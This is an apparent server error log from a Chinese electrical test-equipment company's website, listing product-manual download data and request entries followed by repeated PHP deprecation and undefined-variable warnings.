[ download ] [{"id":242,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":244,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":260,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":262,"title":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20260309\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":263,"title":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":264,"title":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":268,"title":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":270,"title":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/405841dc3a1790083cdfb28d392a51b6.pdf","agreement":"","drive":"","resource":""},{"id":271,"title":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/88bebf25cc9f75277abfb9945aa00ebc.pdf","agreement":"","drive":"","resource":""},{"id":272,"title":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/4eeb7970b89981df90d0560b8dbe2ff8.pdf","agreement":"","drive":"","resource":""},{"id":290,"title":"\u4ea4\u6d41\u6052\u6d41\u6e90","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":291,"title":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":295,"title":"\u5c0f\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":298,"title":"\u533b\u7528\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eea","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":299,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66763U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":300,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 10kw-15kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":303,"title":"\u5b89\u89c4\u7efc\u5408\u6821\u51c6\u70b9\u68c0\u5de5\u88c5","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":304,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea5KV\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":306,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":307,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":308,"title":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":309,"title":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":311,"title":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":312,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":314,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":315,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/7c63757a23e5e98e594bf1b4bf50445a.pdf","agreement":"","drive":"","resource":""},{"id":316,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":317,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":318,"title":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":319,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/29f9570871ea60e153dce0b05698a13e.pdf","agreement":"","drive":"","resource":""},{"id":320,"title":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/d94e60f7d79a2b3b6d9b106bf787c6db.pdf","agreement":"","drive":"","resource":""},{"id":321,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66764U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":322,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66765U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":323,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667620K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":324,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667640K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":325,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667660K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":326,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 20kw-30kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":327,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 40kw-60kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":328,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 75kw-90kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":329,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-U \u9ad8\u538b\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":330,"title":"\u4ea4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/18ff267d1dc26e503128741d78be61d7.pdf","agreement":"","drive":"","resource":""},{"id":331,"title":"\u4ea4\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/04725819a3c60dff3e1af918dc2ccaf2.pdf","agreement":"","drive":"","resource":""},{"id":332,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/639e5850541f700cdc64053f1d7a18a7.pdf","agreement":"","drive":"","resource":""},{"id":333,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":337,"title":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"title":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T14:21:16+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html?type=5&name=%E5%BA%94%E7%94%A8%E4%BA%A7%E5%93%81%E8%B5%84%E6%96%99
[ download ] [{"id":262,"name":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":291,"name":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":318,"name":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":337,"name":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"name":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T14:23:58+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/qiyexinwen
[ error ] [2]Undefined variable $content
[ error ] [2]Trying to access array offset on value of type null
---------------------------------------------------------------
[ 2026-03-18T14:24:09+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/hangyedongtai
[ error ] [2]Undefined variable $content
[ error ] [2]Trying to access array offset on value of type null
---------------------------------------------------------------
[ 2026-03-18T14:38:40+08:00 ] 52.167.144.170 GET www.punalei.cn/ldcms/gaosutongdaocaijiwenduceshiyiPNL2000PLUSxilie/272.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:41:29+08:00 ] 52.167.144.170 GET www.punalei.cn/ldcms/ceshi/324.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:52:14+08:00 ] 40.77.167.224 GET www.punalei.cn/ldcms/ceshi/321.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:55:48+08:00 ] 14.220.182.223 GET www.punalei.cn/?spm=5176.28103460.0.0.6d3f6308uOaC4U
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:55:59+08:00 ] 140.205.85.39 HEAD www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:56:00+08:00 ] 123.183.235.155 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:56:04+08:00 ] 121.41.232.20 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:58:07+08:00 ] 40.77.167.20 GET www.punalei.cn/ldcms/zhiliudianzifuzai/333.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:22:51+08:00 ] 185.12.59.118 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T15:25:03+08:00 ] 98.159.37.183 GET punalei.cn/wp-includes/css/buttons.css
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:30:35+08:00 ] 40.77.167.241 GET www.punalei.cn/ldcms/punaleiPNAIdangongnenganguixilie/307.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:44:22+08:00 ] 52.167.144.221 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T15:45:47+08:00 ] 198.235.24.134 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T15:48:39+08:00 ] 40.77.167.158 GET www.punalei.cn/ldcms/2jidanxianggonglvjiPNL300xilie/338.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
